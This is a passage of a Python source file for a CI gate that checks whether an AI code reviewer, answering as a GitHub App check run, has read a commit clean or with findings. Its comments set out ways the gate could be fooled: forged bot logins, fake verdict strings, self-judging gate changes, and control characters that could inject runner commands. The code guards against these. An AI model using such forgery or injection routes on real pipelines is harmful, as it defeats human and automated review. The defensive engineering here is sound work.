#!/usr/bin/env python3
"""Has a reviewer read THIS commit, and did it leave anything on it?

A review clears only the commit it read, and a reviewer answers in shapes that
mean opposite things. Missing one fails in the good case: a clean pass leaves the
check red for ever, which is how a Juku Perfume pull request sat red overnight on
8 September with the reviewer having read the head and said it was fine. Matching
loosely fails in the worse direction: on 13 September the reviewer showed that a
substring test passes on "Task Completed for `abc1234`; no review was performed",
so the gate would certify a commit nobody read.

Counting read and clean as one answer — which this gate did until 14 September —
fails in a third direction, and #21 is the proof: it merged on a commit carrying
a P1 the reviewer had posted and nobody had answered, because a read was all the
gate could see. So the gate gives one of three answers about the head commit, and
opens on the first alone:

    clean         read clean by a reviewer on the register
    findings      read, and the reviewer left something blocking on it
    unread        no finished read of this commit at all

There were five until 22 September 2026. `cross-vendor` — read clean, but by the
reviewer this change may NOT use — went with the second vendor; see below.
`no verdict` — a review running and not yet said — went because nothing can
produce it; see `check_run_verdict`.

A finding outranks every other answer about the same commit. The answer to a
finding is a push, and a push makes a new commit for the reviewer to read; what
the CTO says about the old one never clears it.

WHAT A READ HAS TO BE, AND WHY THE REVIEWER IS A BADGE AND NOT A LOGIN.
#34 closed at round ten having established the bar this file is built to:
a read must arrive **under a login a branch cannot wear, as a signal a branch
cannot erase**. #38 was built against `github-actions[bot]` posting a comment and
met neither half — that login belongs to every workflow token here, so a workflow
on a throwaway branch can wear it, and an issue comment can be edited or deleted
by anyone with write access, which is the population this gate defends against.

So the reviewer answers as a **check run created by the `juku-reviewer` GitHub
App** (id below). Both halves come from that one fact:

  * Only a GitHub App can create a check run. A repository writer cannot create
    one, cannot edit one, and cannot delete one. That is the signal half.
  * Creating it needs an installation token, which needs the App's private key,
    which lives in the `reviewer` environment restricted to `main`. A run whose
    ref is a branch cannot read it. That is the login half, and
    `.github/workflows/door.yml` is the standing proof of it rather than the
    claim — run it on a branch and the job is refused before it starts.

Nothing is parsed out of prose for that reviewer: the commit is the check run's
own `head_sha` and the verdict is its own `conclusion`. The comment its workflow
also posts is for people to read, and this gate does not count it, which is why
it does not matter who can edit it.

WHO REVIEWS IS THE REGISTER, AND NOTHING ELSE. The Chairman's ruling of 22
September 2026: *"Do not use Codex as a reviewer. Only use Sonnet 5 and Fable 5.1
as the main reviewer."* So the register holds one reviewer, the badge, and it
clears every commit. Fable 5.1 is named in the ruling and is NOT written down
here, because it has no App, no check-run name and no workflow: a register entry
that can never answer holds every commit shut for ever, which is the deadlock
this change exists to end. When one answers it joins the register — and the rule
for the classes that want two reads is written and tested in that same pull
request, because `verdict()` opens on the first clean read and a second name
alone would quietly buy nothing.

WHY THE CROSS-VENDOR DOOR IS GONE, SAID PLAINLY RATHER THAN QUIETLY. The rulebook
requires *the other vendor* on pricing, live database changes or schema,
authentication and authorisation, public trust boundaries, deploy and release
machinery, and this review gate itself. Of that list this repository only ever
holds the last, and it was held here as "`GATE_REVIEWER` alone may clear it" with
`GATE_REVIEWER = "codex"`. One vendor cannot be the other one, so after the
ruling that rule had no satisfiable form: the only commit it would open was one
Codex had read, and Codex is not to be asked. **A gate change and an ordinary
change now clear the same way, on the badge's read.** That is a real loss of a
second pair of eyes on the most dangerous diff here, it is not disguised as
anything else, and what ends it is a second reviewer on the register rather than
a sentence.

AND THE HAZARD THAT OUTLIVED THE DOOR, WHICH IS NOT ABOUT VENDORS AT ALL. The
check that judges a pull request is the pull request's own: check.yml checks the
head out and runs the tree's `check.sh`, so a change to this file is judged by
the version of this file it proposes. That was true before the ruling and is true
after it. Nothing here can fix it — a gate cannot be its own guard — so
`touches_the_gate` stays, and the check says so out loud on a gate change,
whichever way it answers, so the reviewer and the CTO read it rather than infer
it.

Every shape is matched by its exact form, and --selftest holds the match against
the real ones and the fakes on every run of check.sh — no network, no GitHub, and
it fails the build before a loose rule can pass a commit.
"""

import glob
import http.server
import io
import json
import importlib.util
import os
import re
import shlex
import shutil
import ssl
import concurrent.futures
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

# The selftest imports model-registry/'s scripts; a cache written beside them
# would be a file no list names.
sys.dont_write_bytecode = True

# ---------------------------------------------------------------------------
# Who reviews, and as what. The Chairman changes any of these in one line.
#
# DEFAULT_REVIEWER reads every pull request. There is no second name beside it:
# his ruling of 22 September 2026 retired Codex as a reviewer, and the door that
# named it is gone rather than pointed somewhere else — see the docstring.
DEFAULT_REVIEWER = "claude"

# WHO READS IS A ROLE, AND THE REGISTRY SAYS WHO HOLDS IT (decision 0008, issue
# #103, 25 September 2026, on the 18 September consensus). No model is named in
# this file or in either reviewer: the class a change is read as names a role,
# and model-registry/registry.json on the protected branch resolves the role to
# a model, a provider and an effort. A switch is one edit to that file, which is
# in the gate's own risky class. _check_registry() holds what the roles owe:
# ordinary changes to ORDINARY_ROLE and risky ones to RISKY_ROLE, each with
# FALLBACK_ROLE behind it when it does not answer (the risky one since his
# ruling of 30 September 2026). Neither answering leaves the commit unread: the
# gate never fails open.
REGISTRY = "model-registry/registry.json"
RESOLVER = "model-registry/resolve.py"
ORDINARY_ROLE = "reviewer-main"
RISKY_ROLE = "reviewer-risky"
FALLBACK_ROLE = "reviewer-fallback"
# And every read is at one effort, whatever its class: his ruling of 28
# September 2026 ("models now"), in his words, "every read at max". It
# supersedes decision 0005's "max only for reviews of the risky classes"
# (issue #75, 23 September 2026), and with it the CTO's reading that held
# pages and ordinary code at high, a step above a lead then building at
# medium. The class still names the role, and so the model (and, in
# review.yml, what a read is given); it no longer moves the effort. The
# registry sets each role's effort; this file refuses a registry that sets any
# reviewer role otherwise, and each reviewer refuses to read at any other. The
# class is worked out in each workflow and held below, at CLASS_FIRST.
REVIEW_EFFORT = "max"

# The badge. `juku-reviewer`, created on the Chairman's account 19 September 2026;
# installation 162987297. The id is the
# identity — a slug can be renamed by its owner, an id cannot — and the check
# run's name keeps a later, unrelated use of the same App from reading as a
# review.
REVIEWER_APP_ID = 5000405
REVIEWER_CHECK = "juku-reviewer"
REVIEWER_ASK = "/claude review"

# The environment that holds its private key, and the standing proof that a
# branch cannot reach in. Both named here because the wiring check below refuses
# a build where the workflow has stopped naming either.
KEY_ENVIRONMENT = "reviewer"

# The three answers: FINDINGS and CLEAN, worst first, are what a read can say,
# and UNREAD is what the gate says when no read has. A commit is judged by the
# strongest thing said about it, and only CLEAN opens the gate. A read whose
# findings are all advisory is signed success, so it arrives here as CLEAN.
#
# CROSS_VENDOR was another, and it is deleted rather than kept for a day it might
# mean something again. It said "a reviewer read this clean, but not the one this
# class of change requires" — and with one reviewer on the register there is no
# such reviewer, so every route to it was dead. A state no input can reach, with
# a case in the selftest asserting it, is a green test standing guard over
# nothing; this repository was caught by exactly that on #46 and it is not worth
# repeating to hold a word.
FINDINGS = "findings"
CLEAN = "clean"
UNREAD = "unread"
ORDER = (FINDINGS, CLEAN)


# ---------------------------------------------------------------------------
# NOTHING IS READ OUT OF PROSE ANY MORE, AND THAT IS THE LARGEST THING HERE.
#
# Codex answered in prose, so the gate had to match its sentences exactly, and
# most of the fakes this file was ever fooled by lived in that one seam: "Codex
# Review: Found major issues" carries the two words and means the opposite (#21);
# "…Didn't find any major issues because the review did not complete" carries the
# whole verdict and takes it back (#24); "I almost didn't find any major issues"
# is its mirror. Each was a P1, each was answered by a tighter regex, and the
# tighter regex needed the next case to prove it.
#
# With Codex retired from the register that whole class is deleted rather than
# left unreachable: `_says_clean`, the summary-row and reviewed-commit matchers,
# the short-sha resolver behind them, and the submitted-review reader that only
# Codex could trip. The badge answers as a check run — the commit is a field
# GitHub fills and the verdict is a field only the App that signed it can set —
# so there is no sentence to parse and no fake to be fooled by. A reviewer added
# to the register later answers the same way or not at all.
#
# The dead code is not kept for the history: the findings above are why the
# guards existed, and this comment is where they are now recorded.


# ---------------------------------------------------------------------------
# The badge. The default reviewer answers as a check run, and a check run needs
# no parsing at all: it carries the commit it is about in a field GitHub fills,
# and the verdict in a field only the App that made it can set.
#
# WHICH CONCLUSIONS ARE A VERDICT, AND WHY THE REST ARE NOT. `success` and
# `failure` are the two the reviewer writes deliberately, and they are the only
# two counted. `neutral` is the shape its workflow writes when it ran and could
# not produce a verdict — reviewer unreachable, no JSON back, diff too big — so
# it is a read that failed, never a read that passed. GitHub writes the others
# itself when a run is cancelled, times out, is skipped or goes stale, and none
# of those is a reviewer saying anything. Listing the two rather than excluding
# the rest is deliberate: a conclusion GitHub adds in future defaults to "not a
# verdict" instead of quietly defaulting to clean.
CONCLUSIONS = {"success": CLEAN, "failure": FINDINGS}


def check_run_verdict(run, head):
    """What one check run says about this commit, or None if it says nothing.

    Every test here is against a field GitHub fills from the credential that
    created the run, not against anything the run itself claims. `app.id` is the
    whole of the identity: a repository writer holds no App credential, so no
    token available to a branch can produce a run carrying this id — and none can
    edit or delete one that exists, which is the half a comment could never give.
    """
    if (run.get("app") or {}).get("id") != REVIEWER_APP_ID:
        return None
    if run.get("name") != REVIEWER_CHECK:
        return None
    # The fetch asks for one commit's runs, so this is belt and braces — and it
    # is what lets verdict() be tested on a list somebody hands it.
    if run.get("head_sha") != head:
        return None
    if run.get("status") != "completed":
        # A run not yet finished says nothing, whatever its conclusion field
        # holds. Nor can it be the badge mid-read: review.yml creates its run
        # once, already completed, when it has a verdict — so a "reading now"
        # answer is one no input reaches, and keeping it with cases asserting
        # it would be the guard over nothing #46 was caught by. The day
        # review.yml opens its run before the read (#46's `Say it is reading`
        # did), a "reading" answer comes back with it, in the same pull request,
        # so a session is told to wait rather than to ask twice.
        return None
    return CONCLUSIONS.get(run.get("conclusion"))


# The register: every reviewer the gate counts, the route its answer arrives by,
# and how a session asks it. One entry, after his ruling of 22 September 2026.
#
# EVERY ENTRY ANSWERS AS A CHECK RUN, AND THAT IS NOW A RULE RATHER THAN A HABIT.
# `_check_routes` below refuses a register entry carrying a `login`, because a
# login is a route through prose — a comment or a submitted review — and this
# gate no longer reads either. It is the same argument that keeps
# `github-actions[bot]` off the register: every workflow token in this repository
# can wear that login, including one on a branch nobody opened as a pull request
# (#34). An App id cannot be worn by a branch at all, so the route and the
# identity are the same fact.
#
# ADDING FABLE 5.1 IS THIS DICTIONARY, THE MATCH IN `check_run_verdict()`, A
# WORKFLOW, AND A RULE — AND IT IS NOT DONE HERE. The match reads one App id and
# one check-run name, and `_check_routes` refuses an entry it could not match,
# so a second name here alone fails the build rather than never being counted.
# His ruling names it beside Sonnet 5. It has no App, no check-run
# name and no workflow, so it is not written down as though it had: a register
# entry that never answers holds every commit shut, which is the deadlock this
# change exists to end. And a second entry alone would not restore the two reads
# the rulebook wants on the gate's own files — `verdict()` opens on the first
# clean read. Whoever adds the entry writes that rule and its cases too.
REVIEWERS = {
    "claude": {"name": REVIEWER_CHECK, "ask": REVIEWER_ASK, "login": None,
               "comment": None, "app_id": REVIEWER_APP_ID},
}


# The gate's own files. A pull request touching any of them is the class the
# rulebook calls "this review gate itself" — where the other vendor was required
# until 22 September 2026, and where nothing is required beyond the ordinary read
# now, because there is no other vendor. What the list still buys is `gate_note()`
# saying so on the run.
#
# The whole of .github/workflows/ stays on the list, and the reason has changed
# rather than gone. #38 had it there because a branch could add a workflow that
# posted the clean shape as `github-actions[bot]`; the badge closes that hole
# outright, since no workflow token can create a check run under an App's id. It
# stays because of what the workflows now are: one holds the environment
# reference that keeps the key out of a branch's reach, one is the reviewer
# itself, one wakes the check, and one is the standing proof of the door. A
# change to any of them is a change to the gate however it is dressed. Narrowing
# it to named files buys nothing and would have to be argued back the first time
# a fifth file mattered.
# board/build.py joins them (#113's fourth read): check.sh runs its selftest
# before the verdict, so a change to it is a change to what the gate runs.
GATE_FILES = ("check.sh", "review-gate.py", "board/build.py")
GATE_DIRS = (".github/workflows/", "model-registry/")


def touches_the_gate(paths):
    return sorted(set(p for p in paths if p in GATE_FILES or p.startswith(GATE_DIRS)))


def verdict(check_runs, head):
    """The gate's one answer about the head commit, and who gave it.

    It takes check runs and nothing else. Reviews and comments were Codex's two
    routes and went with it; a reviewer on this register answers as a check run
    or it is not on the register, which `_check_routes` enforces rather than
    trusts.

    THERE IS NO `gate_files` ARGUMENT ANY MORE, and that is the ruling rather
    than a tidy-up. It selected the one reviewer allowed to clear a change to the
    review machinery, and the only value it ever selected was Codex. With one
    reviewer on the register there is no second one to hand a gate change to, so
    the argument had exactly one possible answer and pretending otherwise would
    be the inversion of #46 in a new coat. What the gate can still say about a
    gate change it says in `gate_note()`, printed beside the answer and read by
    a person; it is no longer something the gate can act on alone.
    """
    said = {}

    def note(answer, key):
        if answer is None or key is None:
            return
        # Worst wins for each reviewer, so a clean pass posted after findings on
        # the same commit does not take them back — and neither does asking again
        # until the answer comes out differently.
        if said.get(key) is None or ORDER.index(answer) < ORDER.index(said[key]):
            said[key] = answer

    for run in check_runs:
        note(check_run_verdict(run, head), DEFAULT_REVIEWER)

    # Every reviewer on the register may clear any change, because there is one.
    # A SECOND ENTRY IS NOT ENOUGH ON ITS OWN: these two loops open on the FIRST
    # clean read, so the day Fable 5.1 joins the register, the rule for the
    # classes that want two reads has to be written and tested in the same pull
    # request. It is not written ahead of time here — a branch no input can reach,
    # with a green case asserting it, is the guard-over-nothing this change
    # deleted CROSS_VENDOR for.
    for key in REVIEWERS:
        if said.get(key) == FINDINGS:
            return FINDINGS, key
    for key in REVIEWERS:
        if said.get(key) == CLEAN:
            return CLEAN, key
    return UNREAD, None


def gate_note(gate_files):
    """What the check says out loud when a pull request changes the gate itself.

    It is not a verdict and it shuts nothing. It exists because the one thing the
    machine could do about this class — hand it to the other vendor — died with
    the second vendor, and the hazard underneath did not: check.yml checks the
    HEAD out and runs the tree's own `check.sh`, so the gate that judged this
    pull request is the gate this pull request proposes. Saying so on the run,
    green or red, is what is left, and it is said rather than left to be inferred
    because a reader who has to infer it usually does not.
    """
    if not gate_files:
        return None
    # The names are the pull request's own writing, and the runner reads a log
    # line starting `::` as a command: a name carrying a line break could start
    # one, and `::stop-commands::` would silence the annotation printed after
    # it. So every control character is written out, never printed.
    shown = [re.sub(r"[\x00-\x1f\x7f]", lambda m: "\\x%02x" % ord(m.group()), f)
             for f in gate_files]
    return ("this pull request changes the review machinery (%s), so the gate that judged it is "
            "the one it proposes, and there is no second reviewer on the register to read it as "
            "well; read the diff, not the green"
            % ", ".join(shown))


def reason(answer, who, head):
    """One line saying why the gate is shut, in the gate's own voice.

    It names the ask rather than the bot, because the next thing a session does
    with this line is act on it.

    It took a `gate_files` argument until the CROSS_VENDOR branch that read it
    was deleted, and kept taking it for a moment after — a parameter no body
    reads is a reader's promise that the answer depends on it. What a gate
    change is owed is said by `gate_note()`, beside this line and not inside it.
    """
    needed = REVIEWERS[DEFAULT_REVIEWER]
    if answer == FINDINGS:
        return ("%s read commit %s and left a blocking finding on it — answer it, land the round's "
                "fixes as one push, and ask once; the gate opens on a commit a reviewer reads "
                "with nothing blocking, never on an answer to a finding" % (REVIEWERS[who]["name"], head))
    return ("no reviewer has read commit %s — open a comment on the pull request with '%s', once; "
            "this check re-runs itself when the verdict lands" % (head, needed["ask"]))


# ---------------------------------------------------------------------------
# The gate, the wake, the reviewer and the door have to agree, and a build is the
# only place anyone would notice that they do not.
#
# A read the gate counts but nothing wakes for is the failure of 8 September
# wearing a new coat: the answer sits on the page, correct, and the check stays
# red until a hand re-runs it. A wake for a login the gate does not count is the
# mirror — a re-run that can never change the answer. Hemz OS hit the first of
# these on 17 September and named the rule that catches both: check the set, not
# the count, and say which half is missing.
WAKE_LOGIN = re.compile(r"github\.event\.comment\.user\.login\s*==\s*'([^']+)'")
# The App behind `github-actions[bot]`, the login every workflow token in this
# repository can wear. The login itself is no longer named here: it was used by
# the register check that refused it and by the comment cases that tried it as a
# fake, and both went with the prose reading. The id remains, and does more
# work than the login ever did — a run carrying it is the nearest thing to a
# forgery this gate will ever be shown, and it is a fake in both suites below.
# #34 is why: a workflow on a branch nobody opened as a pull request can wear
# that login, which is the hole a register entry carrying it would hand back.
ACTIONS_APP = 15368


def wake_logins(text):
    return sorted(set(WAKE_LOGIN.findall(text)))


def triggers(text):
    """The top-level trigger names in a workflow file's `on:` block."""
    found, inside = [], False
    for line in text.splitlines():
        if re.match(r"^on:\s*$", line):
            inside = True
            continue
        if inside:
            if line.strip() and not line.startswith((" ", "\t", "#")):
                break
            m = re.match(r"^  ([A-Za-z_]+):", line)
            if m:
                found.append(m.group(1))
    return sorted(set(found))


CHECK_WORKFLOW = ".github/workflows/check.yml"
REVIEW_WORKFLOW = ".github/workflows/review.yml"
WAKE_WORKFLOW = ".github/workflows/wake.yml"
DOOR_WORKFLOW = ".github/workflows/door.yml"
CALLS_WAKE = "uses: ./" + WAKE_WORKFLOW
DOOR_BRANCHES = "proof/door-*"
# The runs the wake is shown in the selftest below, and what it must pick out of
# them. Run 1 is the whole point: a completed run that SUCCEEDED. Every version
# of this selector that dropped it lost a verdict.
WAKE_RUNS = {"workflow_runs": [
    {"id": 1, "name": "check", "event": "pull_request", "status": "completed", "conclusion": "success"},
    {"id": 2, "name": "check", "event": "pull_request_review", "status": "completed", "conclusion": "failure"},
    {"id": 3, "name": "check", "event": "issue_comment", "status": "completed", "conclusion": "failure"},
    {"id": 4, "name": "Review", "event": "issue_comment", "status": "completed", "conclusion": "failure"},
    {"id": 5, "name": "check", "event": "pull_request", "status": "in_progress", "conclusion": None},
]}
WAKE_PICKS = [1, 2]


# The wake's API call, whole — names AND values. GitHub's list-runs endpoint
# takes `status`, which filters by conclusion server side, so a `status=failure`
# here removes the successful runs before jq ever sees them (Codex's P2 on
# 2e2758d). And `per_page` decides how many runs come back at all: at 1, the one
# result can easily be a `Review` or issue_comment run, `$mine` then matches
# nothing, and the stale green stands again (its P2 on 313f20d). That second one
# is ordinary configuration drift, not obfuscation — exactly what this guard is
# for — so checking the names and shrugging at the values was not good enough.
# `per_page=100` is the page size; the selection is fetched with --paginate, so
# no page size truncates it. The extractor requires that flag: it is the one
# assertion here that is textual rather than behavioural, because paging is a
# property of the HTTP client and cannot be reached by running the jq.
WAKE_QUERY = {"head_sha": "$sha", "per_page": "100"}
# And the endpoint itself. Codex's P2 on 3621303: the extractor threw away
# everything before the `?`, so `actions/runz` passed — and in the workflow a
# failed call used to be swallowed into "nothing to re-run", so a typo in a path
# silently stopped the gate ever being asked again. The swallow is gone too; this
# catches the typo before it can be the thing that has to fail loudly.
WAKE_ENDPOINT = "repos/$REPO/actions/runs"


# THE SHELL THE WAKE REALLY RUNS, and a `gh` that fails in one chosen place.
#
# Written after a claim of mine was wrong. On 21 September I told Codex that the
# swallow class — an error suppressed so the script carries on with a wrong
# answer — could not be guarded, because every check I could think of was a grep
# for `|| echo`, which `|| true`, `; true` or `set +e` walks straight past. That
# is the spelling mistake this file has already made four times. The answer is
# the same one that fixed the selector: stop reading the text and run the thing.
# A stub `gh` fails at exactly one call, the step's own shell runs against it,
# and the step must come out red. No spelling of a suppression survives that,
# because the suppression is the thing being measured rather than described.
#
# Three swallows of this shape have been live here in one day — both reads on
# b81f13d, the re-run POST on 61f4ea5 — and each one turned a wake that could
# not do its job into a wake that reported success, leaving a stale green
# mergeable under a findings verdict.
SWALLOW_GH = r"""#!/usr/bin/env bash
# Stands in for `gh`. Each call the wake makes can be made to fail on its own,
# because a failure shared between two of them proves nothing about the second:
# the first draft failed both reads at once, the wait read died first, and the
# list read's swallow went unnoticed with the test reporting green.
say() { printf '%s\n' "$1"; }
args="$*"
case "$args" in
  *" -X POST "*rerun*)
    [ "${SWALLOW_POST:-ok}" = ok ] && exit 0
    say "HTTP 403: rerun refused" >&2; exit 1 ;;
  *pulls/*)
    [ "${SWALLOW_HEAD:-ok}" = ok ] || { say "HTTP 500" >&2; exit 1; }
    say "deadbeef" ;;
  *actions/runs/[0-9]*)
    [ "${SWALLOW_STATE:-ok}" = ok ] || { say "HTTP 500" >&2; exit 1; }
    say "${SWALLOW_AFTER:-completed}" ;;
  *--paginate*actions/runs*|*actions/runs*--paginate*)
    [ "${SWALLOW_LIST:-ok}" = ok ] || { say "HTTP 500" >&2; exit 1; }
    say 1; say 2 ;;
  *actions/runs*)
    [ "${SWALLOW_BUSY:-ok}" = ok ] || { say "HTTP 500" >&2; exit 1; }
    say 0 ;;
  *)
    # Fail closed, loudly. A call the stub does not know is a wake that has
    # changed shape, and answering it with a cheerful exit 0 would be this very
    # bug committed inside its own guard.
    say "the stub does not recognise: gh $args" >&2; exit 97 ;;
esac
"""

# What must happen when each call fails. The two passing cases carry as much
# weight as the failing ones: without them a step that simply always exits 1
# would satisfy every other line here.
SWALLOW_CASES = (
    ("every call succeeds",                        {},                        False),
    ("the head sha cannot be read",                {"SWALLOW_HEAD": "no"},    True),
    ("the wait loop's read fails",                 {"SWALLOW_BUSY": "no"},    True),
    ("the list of runs to re-run cannot be read",  {"SWALLOW_LIST": "no"},    True),
    ("a re-run is refused and the run has not moved",
     {"SWALLOW_POST": "no"},                                                  True),
    ("a re-run is refused and its state cannot be read",
     {"SWALLOW_POST": "no", "SWALLOW_STATE": "no"},                           True),
    # And the benign refusal must still pass, or "fail loudly" collapses into
    # "fail always" and the wake goes red every time something else re-ran first.
    ("a re-run is refused because it is already queued",
     {"SWALLOW_POST": "no", "SWALLOW_AFTER": "queued"},                       False),
    ("a re-run is refused because it is already running",
     {"SWALLOW_POST": "no", "SWALLOW_AFTER": "in_progress"},                  False),
)


def wake_script(text):
    """The shell `wake.yml`'s step really runs, dedented, or None.

    None whenever what would be run is not faithfully the step — no block, more
    than one, or a `${{ }}` the runner would have substituted and this cannot.
    Testing an approximation of the step and reporting green is the failure the
    whole guard exists to prevent, so it fails closed instead.
    """
    lines = text.splitlines()
    starts = [i for i, l in enumerate(lines) if re.match(r"^\s*run:\s*\|\s*$", l)]
    if len(starts) != 1:
        return None
    i = starts[0]
    indent = len(lines[i]) - len(lines[i].lstrip())
    body = []
    for l in lines[i + 1:]:
        if l.strip() and (len(l) - len(l.lstrip())) <= indent:
            break
        body.append(l[indent + 2:] if l.strip() else "")
    script = "\n".join(body)
    if not script.strip() or "${{" in script:
        return None
    return script


def swallow_verdict(script, env):
    """Run the step against the stub. (exit status, what went wrong or None)."""
    with tempfile.TemporaryDirectory() as d:
        binned = os.path.join(d, "bin")
        os.mkdir(binned)
        for name, body in (("gh", SWALLOW_GH),
                           # So a wait loop cannot hold the build for minutes.
                           ("sleep", "#!/usr/bin/env bash\nexit 0\n")):
            path = os.path.join(binned, name)
            with open(path, "w", encoding="utf-8") as f:
                f.write(body)
            os.chmod(path, 0o755)
        e = dict(os.environ)
        e.update({"PATH": binned + os.pathsep + os.environ.get("PATH", ""),
                  "GH_TOKEN": "not-a-token", "PR": "1", "REPO": "owner/repo"})
        e.update(env)
        try:
            p = subprocess.run(["bash", "-c", script], env=e, capture_output=True,
                               text=True, timeout=120)
        except (OSError, subprocess.SubprocessError) as exc:
            return None, "could not be run (%s)" % exc
        if p.returncode == 97 or "does not recognise" in p.stderr:
            return None, "asked GitHub for something the test does not know: %s" % (
                p.stderr.strip().splitlines()[-1:] or "?")
        return p.returncode, None


def wake_request(text):
    """What the wake asks GitHub for, and the jq it runs on the answer.

    Returns (endpoint, query parameters, jq program), or None if any cannot be
    found — in which case the build fails rather than passing untested.

    `mine` and `runs` are shell variables interpolated into the call, so the
    thing that actually runs is none of these lines on its own. Each is taken
    with findall()[-1], the LAST assignment, because that is the one bash uses:
    Codex's P2 on 2e2758d again, which slipped a second, narrower `mine=` in
    after the canonical one and passed a guard reading the first.
    """
    def last(pattern):
        found = re.findall(pattern, text, re.M)
        return found[-1] if found else None

    mine = last(r"^\s*mine='([^']*)'\s*$")
    runs = last(r'^\s*runs="([^"]*)"\s*$')
    # Anchored on the re-run selection itself, not on any --jq in the file: the
    # busy-wait loop above it has one too, and testing that one would prove
    # nothing about what gets re-run.
    prog = last(r'^\s*(?:if ! )?ran=\$\(gh api --paginate "\$runs" --jq "((?:[^"\\]|\\.)*)"')
    if mine is None or runs is None or prog is None:
        return None
    endpoint, _, _ = runs.partition("?")
    query = dict(re.findall(r'[?&]([^=&]+)=([^&]*)', runs))
    return endpoint, query, prog.replace('\\"', '"').replace("$mine", mine)


USES_ENVIRONMENT = re.compile(r"^\s*environment:\s*" + re.escape(KEY_ENVIRONMENT) + r"\s*$", re.M)


def _read(path):
    with open(path, encoding="utf-8") as f:
        return f.read()


def _check_routes():
    """Every reviewer on the register answers as a check run, and only that way.

    This used to say "exactly one route, login or app_id", because Codex
    answered in prose and the badge in a check run. Codex was the only entry that
    ever used the prose route, and `verdict()` no longer reads a comment or a
    submitted review at all — so a `login` here would not be a second route, it
    would be a reviewer whose answers are silently never counted. It is refused
    outright instead, which also keeps `github-actions[bot]` off the register
    (#34) as a consequence of the rule rather than as a special case beside it.
    """
    bad = 0
    if DEFAULT_REVIEWER not in REVIEWERS:
        print("  wiring: '%s' is not on the register %s" % (DEFAULT_REVIEWER, sorted(REVIEWERS)))
        bad += 1
    if not REVIEWERS:
        print("  wiring: the register is empty, so no commit can ever be cleared")
        bad += 1
    for key in sorted(REVIEWERS):
        who = REVIEWERS[key]
        if who["app_id"] is None:
            print("  wiring: reviewer '%s' has no app_id. Only a GitHub App can create a check "
                  "run, and a check run is the only answer this gate reads" % key)
            bad += 1
        if who["login"] is not None or who["comment"] is not None:
            print("  wiring: reviewer '%s' carries a login or a comment matcher — a route through "
                  "prose, which this gate stopped reading when Codex was retired. Its answers "
                  "would never be counted and the gate would read as unread for ever" % key)
            bad += 1
        # The same fault by another road: `check_run_verdict()` matches one App id
        # and one check-run name, so an entry naming any other is never counted.
        if who["app_id"] != REVIEWER_APP_ID or who["name"] != REVIEWER_CHECK:
            print("  wiring: reviewer '%s' is on the register as App %s, check run '%s', but "
                  "check_run_verdict() matches App %s, check run '%s' alone — its answers would "
                  "never be counted" % (key, who["app_id"], who["name"], REVIEWER_APP_ID,
                                        REVIEWER_CHECK))
            bad += 1
    return bad


def _check_wiring():
    """The four workflow files, held against the register and each other."""
    bad = _check_routes()
    if bad:
        return bad
    try:
        check = _read(CHECK_WORKFLOW)
        review = _read(REVIEW_WORKFLOW)
        door = _read(DOOR_WORKFLOW)
        wake = _read(WAKE_WORKFLOW)
        wake_on = triggers(wake)
    except OSError as e:
        print("  wiring: %s" % e)
        return 1
    # No login is counted — `_check_routes` above refuses one on the register —
    # so a line in check.yml waking for a login's comment is a re-run that can
    # never change the answer, whoever it names. The half that asked whether
    # every counted login was listened for went with the logins: it looped over
    # a set `_check_routes` holds empty, a guard over nothing.
    for login in sorted(set(wake_logins(check))):
        print("  wiring: %s listens for %s, whom the gate does not count — a re-run that can "
              "never change the answer" % (CHECK_WORKFLOW, login))
        bad += 1

    # The gate reads check runs, and a workflow that may not read them gets a 403
    # where it expects an answer. Cheap to assert, and the failure it prevents
    # reads like "the reviewer has not read this commit".
    if "checks: read" not in check:
        print("  wiring: %s does not grant `checks: read`, so the gate cannot see the badge's "
              "check run at all and every pull request reads as unread" % CHECK_WORKFLOW)
        bad += 1

    # The reviewer runs on `issue_comment` and nothing else, which is half of its
    # independence: that trigger runs the workflow file from the DEFAULT branch,
    # and it is also the ref the environment's branch policy admits. On
    # `pull_request` a branch would run a reviewer of its own writing, and the
    # environment would refuse it the key — so the failure would be confusing
    # rather than dangerous, but it would still be a reviewer nobody wrote down.
    if triggers(review) != ["issue_comment"]:
        print("  wiring: %s triggers on %s; it must be issue_comment and nothing else, or a "
              "branch can run a reviewer of its own writing" % (REVIEW_WORKFLOW, triggers(review)))
        bad += 1

    # The ask opens the comment, and nothing else starts a read. Matched as a
    # substring it spent reads on #51 and #56 — both times a comment that only
    # quoted the ask, once in the gate's own reason line pasted as evidence.
    # Held on both halves, because adding the anchor beside a loose match
    # would read as fixed and change nothing.
    anchored = "startsWith(github.event.comment.body, '%s')" % REVIEWER_ASK
    loose = "contains(github.event.comment.body, '%s')" % REVIEWER_ASK
    if anchored not in review or loose in review:
        print("  wiring: %s must start a read only on a comment that opens with '%s' — "
              "`%s`, and no `%s` beside it — or a comment quoting the ask spends a read"
              % (REVIEW_WORKFLOW, REVIEWER_ASK, anchored, loose))
        bad += 1
    if wake_on != ["workflow_call"]:
        print("  wiring: %s triggers on %s; it must be workflow_call and nothing else"
              % (WAKE_WORKFLOW, wake_on))
        bad += 1

    # THE WAKE MUST ASK AGAIN WHATEVER THE CHECK CURRENTLY SAYS. A verdict used
    # to move the gate only from red to green, so the wake re-ran the red runs
    # and that was enough. The gate keeps the worst answer a commit has been
    # given, so a second read of a commit already read clean can leave findings
    # on it, and the check must go from green to RED — by a second reviewer, as
    # on #43, or by a second ask of the one reviewer on the same commit. On 21
    # September that happened on #43 and the wake answered "no red check run —
    # nothing to re-run", leaving a stale green under a findings verdict.
    #
    # WHAT THIS GUARD IS FOR, AND WHAT IT IS NOT. It catches drift: a later
    # session narrowing the selection while tidying, which is how the defect
    # arrived. It is not tamper-proof and is not trying to be, AND THE THING IT
    # LEANED ON IS WEAKER THAN IT WAS: this said that `wake.yml` is a gate file,
    # so any edit to it needed the other vendor's cold read before it could
    # merge, and that read was what stood against a deliberate obfuscation.
    # Since 22 September 2026 there is no other vendor, so what stands there is
    # one reviewer of the same vendor as the lead, reading a diff that proposes
    # the gate judging it. That is a real weakening of this guard's backstop and
    # it is written here rather than left implied by a comment that stopped
    # being true. Codex walked through three versions of this guard by
    # rephrasing (a blacklisted operator, then bracket syntax inside `$mine`,
    # then a server-side `status=` filter and a shadowing second assignment),
    # and each pass made it better; the honest limit is written here rather
    # than left for the next reader to discover.
    #
    # It runs the selector instead of reading it: the jq program is assembled
    # the way the shell assembles it, fed runs whose right answer is known, and
    # the output compared. Run 1 is the point — completed, and SUCCEEDED.
    request = wake_request(wake)
    if request is None:
